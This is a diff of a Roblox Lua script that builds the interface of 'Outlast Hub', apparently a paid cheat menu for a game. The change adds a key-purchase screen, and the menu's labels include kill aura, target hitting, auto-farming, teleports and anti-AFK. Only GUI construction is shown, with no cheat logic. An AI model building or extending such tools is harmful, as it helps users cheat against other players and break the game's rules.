@@ -1,33 +1,31 @@
---[[
 
-		Gui2Lua™
-		10zOfficial
-		Version 1.0.0
-
-]]
-
-
--- Instances
-
-local OutlastHub = Instance.new("ScreenGui")
+local OutlastHubNewKEY = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
-local BackGround = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+local ImageLabel = Instance.new("ImageLabel")
+local Enter = Instance.new("TextButton")
+local TextBox = Instance.new("TextBox")
 local UICorner = Instance.new("UICorner")
+local TextLabel_2 = Instance.new("TextLabel")
+local OutlastHubFIASMODDED = Instance.new("ScreenGui")
+local Frame_2 = Instance.new("Frame")
+local BackGround = Instance.new("Frame")
+local UICorner_2 = Instance.new("UICorner")
 local Window = Instance.new("TextLabel")
 local Toggle = Instance.new("TextButton")
-local ImageLabel = Instance.new("ImageLabel")
-local UICorner_2 = Instance.new("UICorner")
+local ImageLabel_2 = Instance.new("ImageLabel")
+local UICorner_3 = Instance.new("UICorner")
 local Container = Instance.new("Frame")
 local Tab1 = Instance.new("Frame")
-local UICorner_3 = Instance.new("UICorner")
+local UICorner_4 = Instance.new("UICorner")
 local Tab1Button = Instance.new("TextButton")
-local ImageLabel_2 = Instance.new("ImageLabel")
-local Tab2Button = Instance.new("TextButton")
 local ImageLabel_3 = Instance.new("ImageLabel")
-local Tab3Button = Instance.new("TextButton")
+local Tab2Button = Instance.new("TextButton")
 local ImageLabel_4 = Instance.new("ImageLabel")
-local Tab4Button = Instance.new("TextButton")
+local Tab3Button = Instance.new("TextButton")
 local ImageLabel_5 = Instance.new("ImageLabel")
+local Tab4Button = Instance.new("TextButton")
+local ImageLabel_6 = Instance.new("ImageLabel")
 local Padding = Instance.new("UIPadding")
 local TabFrame3 = Instance.new("ScrollingFrame")
 local Library = Instance.new("TextButton")
@@ -35,135 +33,209 @@ local GYM = Instance.new("TextButton")
 local Outside = Instance.new("TextButton")
 local TabFrame4 = Instance.new("ScrollingFrame")
 local Rejoin = Instance.new("TextButton")
-local TextLabel = Instance.new("TextLabel")
-local WipButton = Instance.new("TextButton")
-local UICorner_4 = Instance.new("UICorner")
-local TabFrame2 = Instance.new("ScrollingFrame")
-local TextLabel_2 = Instance.new("TextLabel")
 local TextLabel_3 = Instance.new("TextLabel")
-local WipButton_2 = Instance.new("TextButton")
+local WipButton = Instance.new("TextButton")
 local UICorner_5 = Instance.new("UICorner")
+local TabFrame2 = Instance.new("ScrollingFrame")
+local TextLabel_4 = Instance.new("TextLabel")
+local TextLabel_5 = Instance.new("TextLabel")
+local WipButton_2 = Instance.new("TextButton")
+local UICorner_6 = Instance.new("UICorner")
 local mainFrame = Instance.new("Frame")
 local bSliderFrame = Instance.new("Frame")
 local slideFrame = Instance.new("Frame")
 local amountValue = Instance.new("TextLabel")
-local UICorner_6 = Instance.new("UICorner")
-local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
-local TextLabel_4 = Instance.new("TextLabel")
-local TextLabel_5 = Instance.new("TextLabel")
-local WipButton_3 = Instance.new("TextButton")
 local UICorner_7 = Instance.new("UICorner")
+local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
+local TextLabel_6 = Instance.new("TextLabel")
+local TextLabel_7 = Instance.new("TextLabel")
+local WipButton_3 = Instance.new("TextButton")
+local UICorner_8 = Instance.new("UICorner")
 local mainFrame_2 = Instance.new("Frame")
 local bSliderFrame_2 = Instance.new("Frame")
 local slideFrame_2 = Instance.new("Frame")
 local amountValue_2 = Instance.new("TextLabel")
-local UICorner_8 = Instance.new("UICorner")
+local UICorner_9 = Instance.new("UICorner")
 local UIAspectRatioConstraint_2 = Instance.new("UIAspectRatioConstraint")
 local TargetHit = Instance.new("TextLabel")
 local WipButton_4 = Instance.new("TextButton")
-local UICorner_9 = Instance.new("UICorner")
-local TargetBox = Instance.new("TextBox")
 local UICorner_10 = Instance.new("UICorner")
-local TextLabel_6 = Instance.new("TextLabel")
-local TextLabel_7 = Instance.new("TextLabel")
-local WipButton_5 = Instance.new("TextButton")
+local TargetBox = Instance.new("TextBox")
 local UICorner_11 = Instance.new("UICorner")
+local TextLabel_8 = Instance.new("TextLabel")
+local TextLabel_9 = Instance.new("TextLabel")
+local WipButton_5 = Instance.new("TextButton")
+local UICorner_12 = Instance.new("UICorner")
 local mainFrame_3 = Instance.new("Frame")
 local bSliderFrame_3 = Instance.new("Frame")
 local slideFrame_3 = Instance.new("Frame")
 local amountValue_3 = Instance.new("TextLabel")
-local UICorner_12 = Instance.new("UICorner")
-local UIAspectRatioConstraint_3 = Instance.new("UIAspectRatioConstraint")
-local TextLabel_8 = Instance.new("TextLabel")
-local TextLabel_9 = Instance.new("TextLabel")
-local WipButton_6 = Instance.new("TextButton")
 local UICorner_13 = Instance.new("UICorner")
+local UIAspectRatioConstraint_3 = Instance.new("UIAspectRatioConstraint")
+local TextLabel_10 = Instance.new("TextLabel")
+local TextLabel_11 = Instance.new("TextLabel")
+local WipButton_6 = Instance.new("TextButton")
+local UICorner_14 = Instance.new("UICorner")
 local mainFrame_4 = Instance.new("Frame")
 local bSliderFrame_4 = Instance.new("Frame")
 local slideFrame_4 = Instance.new("Frame")
 local amountValue_4 = Instance.new("TextLabel")
-local UICorner_14 = Instance.new("UICorner")
-local UIAspectRatioConstraint_4 = Instance.new("UIAspectRatioConstraint")
-local TextLabel_10 = Instance.new("TextLabel")
-local TextLabel_11 = Instance.new("TextLabel")
-local WipButton_7 = Instance.new("TextButton")
 local UICorner_15 = Instance.new("UICorner")
+local UIAspectRatioConstraint_4 = Instance.new("UIAspectRatioConstraint")
+local TextLabel_12 = Instance.new("TextLabel")
+local TextLabel_13 = Instance.new("TextLabel")
+local WipButton_7 = Instance.new("TextButton")
+local UICorner_16 = Instance.new("UICorner")
 local mainFrame_5 = Instance.new("Frame")
 local bSliderFrame_5 = Instance.new("Frame")
 local slideFrame_5 = Instance.new("Frame")
 local amountValue_5 = Instance.new("TextLabel")
-local UICorner_16 = Instance.new("UICorner")
+local UICorner_17 = Instance.new("UICorner")
 local UIAspectRatioConstraint_5 = Instance.new("UIAspectRatioConstraint")
 local FarmTarget = Instance.new("TextLabel")
 local WipButton_8 = Instance.new("TextButton")
-local UICorner_17 = Instance.new("UICorner")
-local TargetBox_2 = Instance.new("TextBox")
 local UICorner_18 = Instance.new("UICorner")
+local TargetBox_2 = Instance.new("TextBox")
+local UICorner_19 = Instance.new("UICorner")
 local Folder = Instance.new("Folder")
 local TextButton = Instance.new("TextButton")
-local TextLabel_12 = Instance.new("TextLabel")
+local TextLabel_14 = Instance.new("TextLabel")
 local SecondPage = Instance.new("ScrollingFrame")
 local MouseClickTouchPlayertoKill = Instance.new("TextLabel")
 local WipButton_9 = Instance.new("TextButton")
-local UICorner_19 = Instance.new("UICorner")
+local UICorner_20 = Instance.new("UICorner")
 local Folder_2 = Instance.new("Folder")
 local TextButton_2 = Instance.new("TextButton")
-local TextLabel_13 = Instance.new("TextLabel")
-local TextLabel_14 = Instance.new("TextLabel")
-local TextButton_3 = Instance.new("TextButton")
-local UICorner_20 = Instance.new("UICorner")
 local TextLabel_15 = Instance.new("TextLabel")
-local TextButton_4 = Instance.new("TextButton")
-local UICorner_21 = Instance.new("UICorner")
-local TabFrame1 = Instance.new("ScrollingFrame")
 local TextLabel_16 = Instance.new("TextLabel")
-local WipButton_10 = Instance.new("TextButton")
-local UICorner_22 = Instance.new("UICorner")
+local TextButton_3 = Instance.new("TextButton")
+local UICorner_21 = Instance.new("UICorner")
 local TextLabel_17 = Instance.new("TextLabel")
-local TextButton_5 = Instance.new("TextButton")
-local UICorner_23 = Instance.new("UICorner")
+local TextButton_4 = Instance.new("TextButton")
+local UICorner_22 = Instance.new("UICorner")
+local TabFrame1 = Instance.new("ScrollingFrame")
 local TextLabel_18 = Instance.new("TextLabel")
-local WipButton_11 = Instance.new("TextButton")
-local UICorner_24 = Instance.new("UICorner")
+local WipButton_10 = Instance.new("TextButton")
+local UICorner_23 = Instance.new("UICorner")
 local TextLabel_19 = Instance.new("TextLabel")
-local WipButton_12 = Instance.new("TextButton")
-local UICorner_25 = Instance.new("UICorner")
+local TextButton_5 = Instance.new("TextButton")
+local UICorner_24 = Instance.new("UICorner")
 local TextLabel_20 = Instance.new("TextLabel")
-local WipButton_13 = Instance.new("TextButton")
-local UICorner_26 = Instance.new("UICorner")
+local WipButton_11 = Instance.new("TextButton")
+local UICorner_25 = Instance.new("UICorner")
 local TextLabel_21 = Instance.new("TextLabel")
+local WipButton_12 = Instance.new("TextButton")
+local UICorner_26 = Instance.new("UICorner")
 local TextLabel_22 = Instance.new("TextLabel")
-local WipButton_14 = Instance.new("TextButton")
+local WipButton_13 = Instance.new("TextButton")
 local UICorner_27 = Instance.new("UICorner")
+local TextLabel_23 = Instance.new("TextLabel")
+local TextLabel_24 = Instance.new("TextLabel")
+local WipButton_14 = Instance.new("TextButton")
+local UICorner_28 = Instance.new("UICorner")
 local mainFrame_6 = Instance.new("Frame")
 local bSliderFrame_6 = Instance.new("Frame")
 local slideFrame_6 = Instance.new("Frame")
 local amountValue_6 = Instance.new("TextLabel")
-local UICorner_28 = Instance.new("UICorner")
-local UIAspectRatioConstraint_6 = Instance.new("UIAspectRatioConstraint")
-local TextLabel_23 = Instance.new("TextLabel")
-local TextLabel_24 = Instance.new("TextLabel")
-local WipButton_15 = Instance.new("TextButton")
 local UICorner_29 = Instance.new("UICorner")
+local UIAspectRatioConstraint_6 = Instance.new("UIAspectRatioConstraint")
 local TextLabel_25 = Instance.new("TextLabel")
-local TextButton_6 = Instance.new("TextButton")
+local TextLabel_26 = Instance.new("TextLabel")
+local WipButton_15 = Instance.new("TextButton")
 local UICorner_30 = Instance.new("UICorner")
+local TextLabel_27 = Instance.new("TextLabel")
+local TextButton_6 = Instance.new("TextButton")
+local UICorner_31 = Instance.new("UICorner")
 
 -- Properties
 
-OutlastHub.Name = "Outlast Hub"
-OutlastHub.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-OutlastHub.ResetOnSpawn = false
+OutlastHubNewKEY.Name = "OutlastHubNewKEY"
+OutlastHubNewKEY.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+OutlastHubNewKEY.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+OutlastHubNewKEY.ResetOnSpawn = false
 
-Frame.Parent = OutlastHub
-Frame.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
-Frame.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
-Frame.BorderSizePixel = 0
-Frame.Position = UDim2.new(0.242596015, 0, 0.326142699, 0)
-Frame.Size = UDim2.new(0, 431, 0, 21)
+Frame.Parent = OutlastHubNewKEY
+Frame.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+Frame.BackgroundTransparency = -3
+Frame.BorderColor3 = Color3.new(0.694118, 0, 0)
+Frame.Position = UDim2.new(0.297766745, 0, 0.345523328, 0)
+Frame.Size = UDim2.new(0, 325, 0, 152)
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+TextLabel.BackgroundTransparency = 1
+TextLabel.BorderColor3 = Color3.new(0, 0, 0)
+TextLabel.BorderSizePixel = 0
+TextLabel.Position = UDim2.new(0.193846151, 0, -0.00657894742, 0)
+TextLabel.Size = UDim2.new(0, 200, 0, 38)
+TextLabel.Font = Enum.Font.SourceSansItalic
+TextLabel.Text = "OUTLAST HUB KEY SYSTEM"
+TextLabel.TextColor3 = Color3.new(1, 1, 1)
+TextLabel.TextSize = 23
+
+ImageLabel.Parent = Frame
+ImageLabel.BackgroundColor3 = Color3.new(1, 1, 1)
+ImageLabel.BackgroundTransparency = 1
+ImageLabel.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
+ImageLabel.Position = UDim2.new(0.0673612133, 0, 0.0347743779, 0)
+ImageLabel.Size = UDim2.new(0, 25, 0, 26)
+ImageLabel.Image = "rbxassetid://10694838454"
+ImageLabel.ImageColor3 = Color3.new(1, 0, 0)
+
+Enter.Name = "Enter"
+Enter.Parent = Frame
+Enter.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+Enter.BorderColor3 = Color3.new(0.694118, 0, 0)
+Enter.BorderSizePixel = 2
+Enter.Position = UDim2.new(0.203076929, 0, 0.526315808, 0)
+Enter.Size = UDim2.new(0, 192, 0, 30)
+Enter.Font = Enum.Font.SourceSans
+Enter.Text = "Enter"
+Enter.TextColor3 = Color3.new(0.694118, 0, 0)
+Enter.TextSize = 14
+
+TextBox.Parent = Frame
+TextBox.BackgroundColor3 = Color3.new(1, 1, 1)
+TextBox.BorderColor3 = Color3.new(0.694118, 0, 0)
+TextBox.Position = UDim2.new(0.255384624, 0, 0.296052635, 0)
+TextBox.Size = UDim2.new(0, 160, 0, 21)
+TextBox.Font = Enum.Font.SourceSans
+TextBox.PlaceholderColor3 = Color3.new(0.694118, 0, 0)
+TextBox.PlaceholderText = "Please Enter Your Key"
+TextBox.Text = ""
+TextBox.TextColor3 = Color3.new(0.694118, 0, 0)
+TextBox.TextSize = 14
+
+UICorner.Parent = Frame
+UICorner.CornerRadius = UDim.new(0, 6)
+
+TextLabel_2.Parent = Frame
+TextLabel_2.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+TextLabel_2.BackgroundTransparency = 1
+TextLabel_2.BorderColor3 = Color3.new(0, 0, 0)
+TextLabel_2.BorderSizePixel = 0
+TextLabel_2.Position = UDim2.new(0.190769225, 0, 0.75, 0)
+TextLabel_2.Size = UDim2.new(0, 200, 0, 38)
+TextLabel_2.Font = Enum.Font.SourceSansItalic
+TextLabel_2.Text = "if you have not purchased a key please do so in the discord "
+TextLabel_2.TextColor3 = Color3.new(1, 1, 1)
+TextLabel_2.TextSize = 15
+
+OutlastHubFIASMODDED.Name = "Outlast Hub (FIAS MODDED)"
+OutlastHubFIASMODDED.Parent = OutlastHubNewKEY
+OutlastHubFIASMODDED.Enabled = false
+OutlastHubFIASMODDED.ResetOnSpawn = false
+
+Frame_2.Parent = OutlastHubFIASMODDED
+Frame_2.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
+Frame_2.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
+Frame_2.BorderSizePixel = 0
+Frame_2.Position = UDim2.new(0.242596015, 0, 0.326142699, 0)
+Frame_2.Size = UDim2.new(0, 431, 0, 21)
+Frame_2.Visible = false
 
 BackGround.Name = "BackGround"
-BackGround.Parent = Frame
+BackGround.Parent = Frame_2
 BackGround.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
 BackGround.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
 BackGround.BorderSizePixel = 0
@@ -171,11 +243,11 @@ BackGround.Position = UDim2.new(-0.000381080288, 0, 1, 0)
 BackGround.Size = UDim2.new(0, 431, 0, 225)
 BackGround.ZIndex = -1
 
-UICorner.Parent = BackGround
-UICorner.CornerRadius = UDim.new(0, 1)
+UICorner_2.Parent = BackGround
+UICorner_2.CornerRadius = UDim.new(0, 1)
 
 Window.Name = "Window"
-Window.Parent = Frame
+Window.Parent = Frame_2
 Window.BackgroundColor3 = Color3.new(1, 1, 1)
 Window.BackgroundTransparency = 1
 Window.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
@@ -189,7 +261,7 @@ Window.TextStrokeTransparency = 0
 Window.TextXAlignment = Enum.TextXAlignment.Left
 
 Toggle.Name = "Toggle"
-Toggle.Parent = Frame
+Toggle.Parent = Frame_2
 Toggle.BackgroundColor3 = Color3.new(1, 1, 1)
 Toggle.BackgroundTransparency = 1
 Toggle.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
@@ -201,20 +273,20 @@ Toggle.TextColor3 = Color3.new(0.956863, 0.921569, 1)
 Toggle.TextSize = 27
 Toggle.TextStrokeTransparency = 0
 
-ImageLabel.Parent = Frame
-ImageLabel.BackgroundColor3 = Color3.new(1, 1, 1)
-ImageLabel.BackgroundTransparency = 1
-ImageLabel.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
-ImageLabel.Position = UDim2.new(0.00889966171, 0, -0.142857149, 0)
-ImageLabel.Size = UDim2.new(0, 25, 0, 26)
-ImageLabel.Image = "rbxassetid://10694838454"
-ImageLabel.ImageColor3 = Color3.new(1, 0, 0)
+ImageLabel_2.Parent = Frame_2
+ImageLabel_2.BackgroundColor3 = Color3.new(1, 1, 1)
+ImageLabel_2.BackgroundTransparency = 1
+ImageLabel_2.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
+ImageLabel_2.Position = UDim2.new(0.00889966171, 0, -0.142857149, 0)
+ImageLabel_2.Size = UDim2.new(0, 25, 0, 26)
+ImageLabel_2.Image = "rbxassetid://10694838454"
+ImageLabel_2.ImageColor3 = Color3.new(1, 0, 0)
 
-UICorner_2.Parent = Frame
-UICorner_2.CornerRadius = UDim.new(0, 1)
+UICorner_3.Parent = Frame_2
+UICorner_3.CornerRadius = UDim.new(0, 1)
 
 Container.Name = "Container"
-Container.Parent = Frame
+Container.Parent = Frame_2
 Container.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
 Container.BorderSizePixel = 0
 Container.Position = UDim2.new(-0.000381080288, 0, 0.857142866, 0)
@@ -229,8 +301,8 @@ Tab1.BorderSizePixel = 0
 Tab1.Position = UDim2.new(-0.0233628377, 0, 0.0140138967, 0)
 Tab1.Size = UDim2.new(0, 139, 0, 213)
 
-UICorner_3.Parent = Container
-UICorner_3.CornerRadius = UDim.new(0, 1)
+UICorner_4.Parent = Container
+UICorner_4.CornerRadius = UDim.new(0, 1)
 
 Tab1Button.Name = "Tab1Button"
 Tab1Button.Parent = Container
@@ -245,13 +317,13 @@ Tab1Button.TextSize = 14
 Tab1Button.TextStrokeTransparency = 0
 Tab1Button.TextXAlignment = Enum.TextXAlignment.Left
 
-ImageLabel_2.Parent = Tab1Button
-ImageLabel_2.BackgroundColor3 = Color3.new(1, 1, 1)
-ImageLabel_2.BackgroundTransparency = 1
-ImageLabel_2.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
-ImageLabel_2.Position = UDim2.new(0.048780486, 0, 0, 0)
-ImageLabel_2.Size = UDim2.new(0, 20, 0, 20)
-ImageLabel_2.Image = "rbxassetid://12671673643"
+ImageLabel_3.Parent = Tab1Button
+ImageLabel_3.BackgroundColor3 = Color3.new(1, 1, 1)
+ImageLabel_3.BackgroundTransparency = 1
+ImageLabel_3.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
+ImageLabel_3.Position = UDim2.new(0.048780486, 0, 0, 0)
+ImageLabel_3.Size = UDim2.new(0, 20, 0, 20)
+ImageLabel_3.Image = "rbxassetid://12671673643"
 
 Tab2Button.Name = "Tab2Button"
 Tab2Button.Parent = Container
@@ -265,13 +337,13 @@ Tab2Button.TextSize = 14
 Tab2Button.TextStrokeTransparency = 0
 Tab2Button.TextXAlignment = Enum.TextXAlignment.Left
 
-ImageLabel_3.Parent = Tab2Button
-ImageLabel_3.BackgroundColor3 = Color3.new(1, 1, 1)
-ImageLabel_3.BackgroundTransparency = 1
-ImageLabel_3.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
-ImageLabel_3.Position = UDim2.new(0.048780486, 0, 0, 0)
-ImageLabel_3.Size = UDim2.new(0, 20, 0, 20)
-ImageLabel_3.Image = "rbxassetid://12671744738"
+ImageLabel_4.Parent = Tab2Button
+ImageLabel_4.BackgroundColor3 = Color3.new(1, 1, 1)
+ImageLabel_4.BackgroundTransparency = 1
+ImageLabel_4.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
+ImageLabel_4.Position = UDim2.new(0.048780486, 0, 0, 0)
+ImageLabel_4.Size = UDim2.new(0, 20, 0, 20)
+ImageLabel_4.Image = "rbxassetid://12671744738"
 
 Tab3Button.Name = "Tab3Button"
 Tab3Button.Parent = Container
@@ -285,13 +357,13 @@ Tab3Button.TextColor3 = Color3.new(1, 1, 1)
 Tab3Button.TextSize = 14
 Tab3Button.TextStrokeTransparency = 0
 
-ImageLabel_4.Parent = Tab3Button
-ImageLabel_4.BackgroundColor3 = Color3.new(1, 1, 1)
-ImageLabel_4.BackgroundTransparency = 1
-ImageLabel_4.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
-ImageLabel_4.Position = UDim2.new(0.048780486, 0, 0, 0)
-ImageLabel_4.Size = UDim2.new(0, 20, 0, 20)
-ImageLabel_4.Image = "rbxassetid://84854819063665"
+ImageLabel_5.Parent = Tab3Button
+ImageLabel_5.BackgroundColor3 = Color3.new(1, 1, 1)
+ImageLabel_5.BackgroundTransparency = 1
+ImageLabel_5.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
+ImageLabel_5.Position = UDim2.new(0.048780486, 0, 0, 0)
+ImageLabel_5.Size = UDim2.new(0, 20, 0, 20)
+ImageLabel_5.Image = "rbxassetid://84854819063665"
 
 Tab4Button.Name = "Tab4Button"
 Tab4Button.Parent = Container
@@ -305,13 +377,13 @@ Tab4Button.TextColor3 = Color3.new(1, 1, 1)
 Tab4Button.TextSize = 14
 Tab4Button.TextStrokeTransparency = 0
 
-ImageLabel_5.Parent = Tab4Button
-ImageLabel_5.BackgroundColor3 = Color3.new(1, 1, 1)
-ImageLabel_5.BackgroundTransparency = 1
-ImageLabel_5.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
-ImageLabel_5.Position = UDim2.new(0.048780486, 0, 0, 0)
-ImageLabel_5.Size = UDim2.new(0, 20, 0, 20)
-ImageLabel_5.Image = "rbxassetid://12671757664"
+ImageLabel_6.Parent = Tab4Button
+ImageLabel_6.BackgroundColor3 = Color3.new(1, 1, 1)
+ImageLabel_6.BackgroundTransparency = 1
+ImageLabel_6.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
+ImageLabel_6.Position = UDim2.new(0.048780486, 0, 0, 0)
+ImageLabel_6.Size = UDim2.new(0, 20, 0, 20)
+ImageLabel_6.Image = "rbxassetid://12671757664"
 
 Padding.Name = "Padding"
 Padding.Parent = Container
@@ -381,20 +453,20 @@ Rejoin.Text = "Rejoin"
 Rejoin.TextColor3 = Color3.new(1, 1, 1)
 Rejoin.TextSize = 14
 
-TextLabel.Parent = TabFrame4
-TextLabel.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
-TextLabel.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
-TextLabel.Position = UDim2.new(0.0261645596, 0, 0.0287268851, 0)
-TextLabel.Size = UDim2.new(0, 282, 0, 27)
-TextLabel.Font = Enum.Font.SourceSans
-TextLabel.Text = "AntiAFK"
-TextLabel.TextColor3 = Color3.new(1, 1, 1)
-TextLabel.TextSize = 14
-TextLabel.TextStrokeTransparency = 0
-TextLabel.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel_3.Parent = TabFrame4
+TextLabel_3.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+TextLabel_3.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
+TextLabel_3.Position = UDim2.new(0.0261645596, 0, 0.0287268851, 0)
+TextLabel_3.Size = UDim2.new(0, 282, 0, 27)
+TextLabel_3.Font = Enum.Font.SourceSans
+TextLabel_3.Text = "AntiAFK"
+TextLabel_3.TextColor3 = Color3.new(1, 1, 1)
+TextLabel_3.TextSize = 14
+TextLabel_3.TextStrokeTransparency = 0
+TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left
 
 WipButton.Name = "WipButton"
-WipButton.Parent = TextLabel
+WipButton.Parent = TextLabel_3
 WipButton.BackgroundColor3 = Color3.new(1, 0, 0)
 WipButton.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
 WipButton.Position = UDim2.new(0.90780139, 0, 0.222222224, 0)
@@ -404,8 +476,8 @@ WipButton.Text = ""
 WipButton.TextColor3 = Color3.new(0, 0, 0)
 WipButton.TextSize = 14
 
-UICorner_4.Parent = WipButton
-UICorner_4.CornerRadius = UDim.new(0, 2)
+UICorner_5.Parent = WipButton
+UICorner_5.CornerRadius = UDim.new(0, 2)
 
 TabFrame2.Name = "TabFrame2"
 TabFrame2.Parent = Container
@@ -415,36 +487,35 @@ TabFrame2.BackgroundTransparency = 1
 TabFrame2.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
 TabFrame2.Position = UDim2.new(0.292551666, 0, -0.0138248848, 0)
 TabFrame2.Size = UDim2.new(0, 297, 0, 225)
-TabFrame2.Visible = false
 TabFrame2.ZIndex = 0
 TabFrame2.ScrollBarThickness = 0
 
-TextLabel_2.Parent = TabFrame2
-TextLabel_2.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
-TextLabel_2.Position = UDim2.new(0.023, 0, 0.0199999996, 0)
-TextLabel_2.Size = UDim2.new(0, 282, 0, 48)
-TextLabel_2.Font = Enum.Font.SourceSans
-TextLabel_2.Text = ""
-TextLabel_2.TextColor3 = Color3.new(1, 1, 1)
-TextLabel_2.TextSize = 14
-TextLabel_2.TextStrokeTransparency = 0
-TextLabel_2.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel_4.Parent = TabFrame2
+TextLabel_4.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+TextLabel_4.Position = UDim2.new(0.023, 0, 0.0199999996, 0)
+TextLabel_4.Size = UDim2.new(0, 282, 0, 48)
+TextLabel_4.Font = Enum.Font.SourceSans
+TextLabel_4.Text = ""
+TextLabel_4.TextColor3 = Color3.new(1, 1, 1)
+TextLabel_4.TextSize = 14
+TextLabel_4.TextStrokeTransparency = 0
+TextLabel_4.TextXAlignment = Enum.TextXAlignment.Left
 
-TextLabel_3.Parent = TextLabel_2
-TextLabel_3.BackgroundColor3 = Color3.new(1, 1, 1)
-TextLabel_3.BackgroundTransparency = 1
-TextLabel_3.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
-TextLabel_3.Position = UDim2.new(0.0248226952, 0, 0, 0)
-TextLabel_3.Size = UDim2.new(0, 72, 0, 27)
-TextLabel_3.Font = Enum.Font.SourceSans
-TextLabel_3.Text = "SlamAura"
-TextLabel_3.TextColor3 = Color3.new(1, 1, 1)
-TextLabel_3.TextSize = 14
-TextLabel_3.TextStrokeTransparency = 0
-TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel_5.Parent = TextLabel_4
+TextLabel_5.BackgroundColor3 = Color3.new(1, 1, 1)
+TextLabel_5.BackgroundTransparency = 1
+TextLabel_5.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
+TextLabel_5.Position = UDim2.new(0.0248226952, 0, 0, 0)
+TextLabel_5.Size = UDim2.new(0, 72, 0, 27)
+TextLabel_5.Font = Enum.Font.SourceSans
+TextLabel_5.Text = "SlamAura"
+TextLabel_5.TextColor3 = Color3.new(1, 1, 1)
+TextLabel_5.TextSize = 14
+TextLabel_5.TextStrokeTransparency = 0
+TextLabel_5.TextXAlignment = Enum.TextXAlignment.Left
 
 WipButton_2.Name = "WipButton"
-WipButton_2.Parent = TextLabel_2
+WipButton_2.Parent = TextLabel_4
 WipButton_2.BackgroundColor3 = Color3.new(1, 0, 0)
 WipButton_2.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
 WipButton_2.Position = UDim2.new(0.904255271, 0, 0.493055522, 0)
@@ -454,11 +525,11 @@ WipButton_2.Text = ""
 WipButton_2.TextColor3 = Color3.new(0, 0, 0)
 WipButton_2.TextSize = 14
 
-UICorner_5.Parent = WipButton_2
-UICorner_5.CornerRadius = UDim.new(0, 2)
+UICorner_6.Parent = WipButton_2
+UICorner_6.CornerRadius = UDim.new(0, 2)
 
 mainFrame.Name = "mainFrame"
-mainFrame.Parent = TextLabel_2
+mainFrame.Parent = TextLabel_4
 mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
 mainFrame.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)
 mainFrame.BackgroundTransparency = 1
@@ -501,39 +572,39 @@ amountValue.TextSize = 15
 amountValue.TextStrokeTransparency = 0
 amountValue.TextWrapped = true
 
-UICorner_6.Parent = bSliderFrame
-UICorner_6.CornerRadius = UDim.new(0, 2)
+UICorner_7.Parent = bSliderFrame
+UICorner_7.CornerRadius = UDim.new(0, 2)
 
 UIAspectRatioConstraint.Parent = mainFrame
 UIAspectRatioConstraint.AspectRatio = 2.009615421295166
 
-TextLabel_4.Parent = TabFrame2
-TextLabel_4.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
-TextLabel_4.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
-TextLabel_4.Position = UDim2.new(0.0227974523, 0, 0.151633263, 0)
-TextLabel_4.Size = UDim2.new(0, 282, 0, 48)
-TextLabel_4.Font = Enum.Font.SourceSans
-TextLabel_4.Text = ""
-TextLabel_4.TextColor3 = Color3.new(1, 1, 1)
-TextLabel_4.TextSize = 14
-TextLabel_4.TextStrokeTransparency = 0
-TextLabel_4.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel_6.Parent = TabFrame2
+TextLabel_6.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+TextLabel_6.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
+TextLabel_6.Position = UDim2.new(0.0227974523, 0, 0.151633263, 0)
+TextLabel_6.Size = UDim2.new(0, 282, 0, 48)
+TextLabel_6.Font = Enum.Font.SourceSans
+TextLabel_6.Text = ""
+TextLabel_6.TextColor3 = Color3.new(1, 1, 1)
+TextLabel_6.TextSize = 14
+TextLabel_6.TextStrokeTransparency = 0
+TextLabel_6.TextXAlignment = Enum.TextXAlignment.Left
 
